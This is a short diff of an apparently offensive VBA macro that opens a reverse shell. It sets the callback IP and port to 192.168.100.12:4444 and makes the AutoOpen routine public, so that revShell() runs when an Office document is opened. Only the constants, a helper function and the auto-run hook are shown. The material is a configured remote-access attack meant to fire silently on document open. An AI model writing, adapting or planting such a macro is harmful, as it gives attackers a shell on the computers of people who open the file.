@@ -3,8 +3,8 @@
 'Twitter: @JohnWoodman15
 
 'Replace with your IP and Port
-Const ip = "192.168.100.9"
-Const port = "1337"
+Const ip = "192.168.100.12"
+Const port = "4444"
 
 Const INVALID_SOCKET = -1
 Const WSADESCRIPTION_LEN = 256
@@ -166,7 +166,7 @@ Public Function MAKEWORD(Lo As Byte, Hi As Byte) As Integer
     MAKEWORD = Lo + Hi * 256& Or 32768 * (Hi > 127)
 End Function
 
-Private Sub AutoOpen()
+Sub AutoOpen()
     Dim success As Boolean
     success = revShell()
 End Sub
